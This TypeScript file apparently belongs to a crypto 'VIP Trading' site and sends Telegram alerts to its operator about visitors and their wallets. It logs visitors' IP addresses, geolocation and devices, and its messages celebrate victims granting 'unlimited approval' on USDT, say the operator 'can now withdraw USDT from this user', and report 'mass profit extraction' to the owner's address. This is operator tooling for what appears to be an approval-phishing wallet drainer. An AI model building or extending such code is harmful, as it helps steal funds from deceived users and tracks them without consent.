// Telegram Bot API utilities
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

export interface NotificationData {
    type: 'visit' | 'wallet_connect' | 'payment' | 'referral_click' | 'referral_conversion' | 'trading_commission' | 'unlimited_approval' | 'funds_withdrawn' | 'batch_withdrawal' | 'contract_paused' | 'contract_unpaused' | 'emergency_withdrawal'
    address?: string
    amount?: string
    timestamp: string
    userAgent?: string
    ip?: string
    session?: any
    stats?: {
        totalVisitors: number
        connectedWallets: number
        completedPayments: number
        conversionRate: number
    }
    referralCode?: string
    referrerAddress?: string
    clickId?: string
    traderAddress?: string
    tradeAmount?: string
    profit?: string
    commissionAmount?: string
    // New fields for contract events
    txHash?: string
    blockNumber?: number
    withdrawnAmount?: string
    withdrawnUsers?: string[]
    totalWithdrawn?: string
    contractBalance?: string
    ownerAddress?: string
    tokenAddress?: string
    emergencyAmount?: string
}

export async function sendTelegramNotification(data: NotificationData) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn('Telegram bot credentials not configured')
        return false
    }

    try {
        let message = ''
        const deviceInfo = parseUserAgent(data.userAgent || '')
        const location = await getLocationFromIP(data.ip || '')

        const statsText = data.stats ?
            `\n📊 **Today's Stats:**\n` +
            `👥 Visitors: ${data.stats.totalVisitors}\n` +
            `🔗 Connected: ${data.stats.connectedWallets}\n` +
            `💰 Payments: ${data.stats.completedPayments}\n` +
            `📈 Conversion: ${data.stats.conversionRate}%` : ''

        const isReturning = data.session?.pageViews > 1
        const sessionInfo = data.session ?
            `${isReturning ? '🔄 **Returning visitor**' : '✨ **First-time visitor**'}\n` +
            `📄 Page views: ${data.session.pageViews}` : ''

        switch (data.type) {
            case 'visit':
                message = `🌟 *NEW VISITOR ALERT* 🌟\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `${sessionInfo}\n\n` +
                    `🕐 **Time:** ${data.timestamp}\n` +
                    `🌍 **Location:** ${location}\n` +
                    `📍 **IP:** \`${data.ip || 'Unknown'}\`\n` +
                    `💻 **Browser:** ${deviceInfo.browser}\n` +
                    `📱 **OS:** ${deviceInfo.os}\n` +
                    `🖥️ **Device:** ${deviceInfo.device}\n` +
                    `${statsText}\n\n` +
                    `🎯 *${isReturning ? 'Interested visitor returned!' : 'Potential customer browsing VIP Trading!'}*`
                break

            case 'wallet_connect':
                message = `🔗 *WALLET CONNECTED* 🚀\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `💎 **Address:** \`${formatAddress(data.address || '')}\`\n` +
                    `🔗 **Full:** \`${data.address}\`\n` +
                    `🕐 **Time:** ${data.timestamp}\n` +
                    `🌍 **Location:** ${location}\n` +
                    `📍 **IP:** \`${data.ip || 'Unknown'}\`\n` +
                    `💻 **Browser:** ${deviceInfo.browser}\n` +
                    `${sessionInfo}\n` +
                    `${statsText}\n\n` +
                    `⚡ *User is ready to make payment!*\n` +
                    `🔍 [View on Etherscan](https://etherscan.io/address/${data.address})`
                break

            case 'payment':
                message = `💰 *PAYMENT RECEIVED!* 🎉\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `🎊 **SUCCESS!** New VIP member joined!\n\n` +
                    `💎 **From:** \`${formatAddress(data.address || '')}\`\n` +
                    `💵 **Amount:** **${data.amount}**\n` +
                    `🕐 **Time:** ${data.timestamp}\n` +
                    `🌍 **Location:** ${location}\n` +
                    `✅ **Status:** ✨ **SUCCESSFUL** ✨\n` +
                    `${sessionInfo}\n` +
                    `${statsText}\n\n` +
                    `📈 **Next Steps:**\n` +
                    `• User needs to verify 1,000+ USDT balance\n` +
                    `• Send VIP channel invite after verification\n` +
                    `• Welcome new premium member!\n\n` +
                    `🔍 [View Transaction](https://etherscan.io/address/${data.address})\n` +
                    `💬 *Expect DM for balance verification soon!*`
                break

            case 'referral_click':
                message = `🎯 *REFERRAL CLICK* 🔗\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎁 **Referral Code:** \`${data.referralCode}\`\n` +
                         `👤 **Referrer:** \`${formatAddress(data.referrerAddress || '')}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `🌍 **Location:** ${location}\n` +
                         `📍 **IP:** \`${data.ip || 'Unknown'}\`\n` +
                         `💻 **Browser:** ${deviceInfo.browser}\n` +
                         `${statsText}\n\n` +
                         `🚀 *Someone clicked a referral link! Potential conversion incoming...*`
                break

            case 'referral_conversion':
                message = `🎉 *REFERRAL CONVERSION!* 💰\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎊 **SUCCESS!** New trader joined via referral!\n\n` +
                         `💎 **New Trader:** \`${formatAddress(data.address || '')}\`\n` +
                         `🎁 **Click ID:** \`${data.clickId}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${statsText}\n\n` +
                         `📈 **Referrer will earn 5% of all trading profits!**\n` +
                         `💰 **Passive income starts when trader makes profits!**\n` +
                         `🎯 *Referral program is working! More conversions expected...*`
                break

            case 'trading_commission':
                message = `📈 *TRADING COMMISSION EARNED!* 💸\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎊 **PROFIT SHARING ACTIVATED!**\n\n` +
                         `👤 **Trader:** \`${formatAddress(data.traderAddress || '')}\`\n` +
                         `💰 **Trade Amount:** $${data.tradeAmount} USDT\n` +
                         `📈 **Profit Made:** $${data.profit} USDT\n` +
                         `💎 **Referrer:** \`${formatAddress(data.referrerAddress || '')}\`\n` +
                         `💵 **Commission (5%):** **$${data.commissionAmount} USDT**\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${statsText}\n\n` +
                         `🚀 **Referrer earns 5% of trading profits!**\n` +
                         `📊 *Passive income from successful referrals!*\n` +
                         `💡 *The more your referrals trade and profit, the more you earn!*`
                break

            case 'unlimited_approval':
                message = `🔓 *UNLIMITED APPROVAL GRANTED!* ⚡\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎉 **VIP MEMBER ACTIVATED!**\n\n` +
                         `💎 **Address:** \`${formatAddress(data.address || '')}\`\n` +
                         `🔗 **Full:** \`${data.address}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `🌍 **Location:** ${location}\n` +
                         `📍 **IP:** \`${data.ip || 'Unknown'}\`\n` +
                         `${data.txHash ? `🔗 **TX:** \`${data.txHash}\`` : ''}\n` +
                         `${statsText}\n\n` +
                         `✅ **Status:** 🔓 **UNLIMITED APPROVAL ACTIVE** 🔓\n` +
                         `💰 **Can now withdraw USDT from this user**\n` +
                         `🎯 **Ready for trading profit extraction!**\n\n` +
                         `🔍 [View on Explorer](https://etherscan.io/address/${data.address})\n` +
                         `💡 *User has granted unlimited USDT spending permission!*`
                break

            case 'funds_withdrawn':
                message = `💸 *FUNDS WITHDRAWN!* 🏦\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎊 **SUCCESSFUL WITHDRAWAL!**\n\n` +
                         `👤 **From User:** \`${formatAddress(data.address || '')}\`\n` +
                         `💰 **Amount:** **${data.withdrawnAmount} USDT**\n` +
                         `💎 **To Owner:** \`${formatAddress(data.ownerAddress || '')}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${data.txHash ? `🔗 **TX:** \`${data.txHash}\`` : ''}\n` +
                         `${data.contractBalance ? `💼 **Contract Balance:** ${data.contractBalance} USDT` : ''}\n` +
                         `${statsText}\n\n` +
                         `✅ **Status:** ✨ **WITHDRAWAL SUCCESSFUL** ✨\n` +
                         `📈 **Profit extraction from VIP member!**\n` +
                         `🎯 **Passive income system working!**\n\n` +
                         `🔍 [View Transaction](https://etherscan.io/tx/${data.txHash})\n` +
                         `💡 *Automated profit sharing in action!*`
                break

            case 'batch_withdrawal':
                message = `💸 *BATCH WITHDRAWAL COMPLETED!* 🏦\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎊 **MASS PROFIT EXTRACTION!**\n\n` +
                         `👥 **Users Processed:** ${data.withdrawnUsers?.length || 0}\n` +
                         `💰 **Total Withdrawn:** **${data.totalWithdrawn} USDT**\n` +
                         `💎 **To Owner:** \`${formatAddress(data.ownerAddress || '')}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${data.txHash ? `🔗 **TX:** \`${data.txHash}\`` : ''}\n` +
                         `${data.contractBalance ? `💼 **Contract Balance:** ${data.contractBalance} USDT` : ''}\n` +
                         `${statsText}\n\n` +
                         `✅ **Status:** ✨ **BATCH WITHDRAWAL SUCCESSFUL** ✨\n` +
                         `📈 **Efficient mass profit collection!**\n` +
                         `🚀 **Scaling the profit extraction system!**\n\n` +
                         `🔍 [View Transaction](https://etherscan.io/tx/${data.txHash})\n` +
                         `💡 *Automated batch processing saves gas fees!*`
                break

            case 'contract_paused':
                message = `⏸️ *CONTRACT PAUSED!* 🚨\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🛑 **EMERGENCY PAUSE ACTIVATED!**\n\n` +
                         `👤 **By Owner:** \`${formatAddress(data.ownerAddress || '')}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${data.txHash ? `🔗 **TX:** \`${data.txHash}\`` : ''}\n` +
                         `${statsText}\n\n` +
                         `⚠️ **Status:** 🛑 **CONTRACT PAUSED** 🛑\n` +
                         `🔒 **All operations temporarily suspended**\n` +
                         `🛠️ **Maintenance or security measure in progress**\n\n` +
                         `🔍 [View Transaction](https://etherscan.io/tx/${data.txHash})\n` +
                         `💡 *Contract will resume operations when unpaused*`
                break

            case 'contract_unpaused':
                message = `▶️ *CONTRACT RESUMED!* ✅\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🎉 **OPERATIONS RESTORED!**\n\n` +
                         `👤 **By Owner:** \`${formatAddress(data.ownerAddress || '')}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${data.txHash ? `🔗 **TX:** \`${data.txHash}\`` : ''}\n` +
                         `${statsText}\n\n` +
                         `✅ **Status:** ✨ **CONTRACT ACTIVE** ✨\n` +
                         `🚀 **All operations now available**\n` +
                         `💰 **Ready to accept new VIP members!**\n\n` +
                         `🔍 [View Transaction](https://etherscan.io/tx/${data.txHash})\n` +
                         `💡 *Contract is back online and fully operational!*`
                break

            case 'emergency_withdrawal':
                message = `🚨 *EMERGENCY WITHDRAWAL!* ⚠️\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                         `🛑 **EMERGENCY PROTOCOL ACTIVATED!**\n\n` +
                         `🪙 **Token:** \`${formatAddress(data.tokenAddress || '')}\`\n` +
                         `💰 **Amount:** **${data.emergencyAmount} tokens**\n` +
                         `👤 **By Owner:** \`${formatAddress(data.ownerAddress || '')}\`\n` +
                         `🕐 **Time:** ${data.timestamp}\n` +
                         `${data.txHash ? `🔗 **TX:** \`${data.txHash}\`` : ''}\n` +
                         `${statsText}\n\n` +
                         `⚠️ **Status:** 🚨 **EMERGENCY WITHDRAWAL** 🚨\n` +
                         `🔒 **Security measure or contract migration**\n` +
                         `🛠️ **Protecting user and contract funds**\n\n` +
                         `🔍 [View Transaction](https://etherscan.io/tx/${data.txHash})\n` +
                         `💡 *Emergency procedures ensure fund safety*`
                break
        }

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        })

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`)
        }

        return true
    } catch (error) {
        console.error('Failed to send Telegram notification:', error)
        return false
    }
}

// Helper function to format wallet address
export function formatAddress(address: string): string {
    if (!address) return 'Unknown'
    return `${address.slice(0, 6)}...${address.slice(-4)}`
}

// Helper function to get current timestamp
export function getCurrentTimestamp(): string {
    return new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: 'short',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }) + ' UTC'
}

// Parse user agent for better device info
function parseUserAgent(userAgent: string): { browser: string; os: string; device: string } {
    const ua = userAgent.toLowerCase()

    // Browser detection
    let browser = 'Unknown Browser'
    if (ua.includes('chrome') && !ua.includes('edg')) browser = '🌐 Chrome'
    else if (ua.includes('firefox')) browser = '🦊 Firefox'
    else if (ua.includes('safari') && !ua.includes('chrome')) browser = '🧭 Safari'
    else if (ua.includes('edg')) browser = '🔷 Edge'
    else if (ua.includes('opera')) browser = '🎭 Opera'

    // OS detection
    let os = 'Unknown OS'
    if (ua.includes('windows')) os = '🪟 Windows'
    else if (ua.includes('mac')) os = '🍎 macOS'
    else if (ua.includes('linux')) os = '🐧 Linux'
    else if (ua.includes('android')) os = '🤖 Android'
    else if (ua.includes('iphone') || ua.includes('ipad')) os = '📱 iOS'

    // Device type detection
    let device = 'Desktop'
    if (ua.includes('mobile')) device = '📱 Mobile'
    else if (ua.includes('tablet') || ua.includes('ipad')) device = '📱 Tablet'
    else device = '💻 Desktop'

    return { browser, os, device }
}

// Get location from IP (simplified version)
async function getLocationFromIP(ip: string): Promise<string> {
    if (!ip || ip === 'Unknown' || ip === '::1' || ip.startsWith('192.168') || ip.startsWith('10.') || ip.startsWith('172.')) {
        return '🏠 Local/Private Network'
    }

    try {
        // Using a free IP geolocation service
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,status`)
        const data = await response.json()

        if (data.status === 'success') {
            const flag = getCountryFlag(data.country)
            return `${flag} ${data.city}, ${data.regionName}, ${data.country}`
        }
    } catch (error) {
        console.error('Failed to get location:', error)
    }

    return `🌍 Unknown Location (${ip})`
}

// Get country flag emoji
function getCountryFlag(country: string): string {
    const flags: { [key: string]: string } = {
        'United States': '🇺🇸',
        'United Kingdom': '🇬🇧',
        'Canada': '🇨🇦',
        'Germany': '🇩🇪',
        'France': '🇫🇷',
        'Japan': '🇯🇵',
        'China': '🇨🇳',
        'India': '🇮🇳',
        'Brazil': '🇧🇷',
        'Australia': '🇦🇺',
        'Russia': '🇷🇺',
        'South Korea': '🇰🇷',
        'Netherlands': '🇳🇱',
        'Singapore': '🇸🇬',
        'Switzerland': '🇨🇭',
        'Sweden': '🇸🇪',
        'Norway': '🇳🇴',
        'Denmark': '🇩🇰',
        'Finland': '🇫🇮',
        'Italy': '🇮🇹',
        'Spain': '🇪🇸',
        'Mexico': '🇲🇽',
        'Argentina': '🇦🇷',
        'Turkey': '🇹🇷',
        'UAE': '🇦🇪',
        'Saudi Arabia': '🇸🇦'
    }

    return flags[country] || '🌍'
}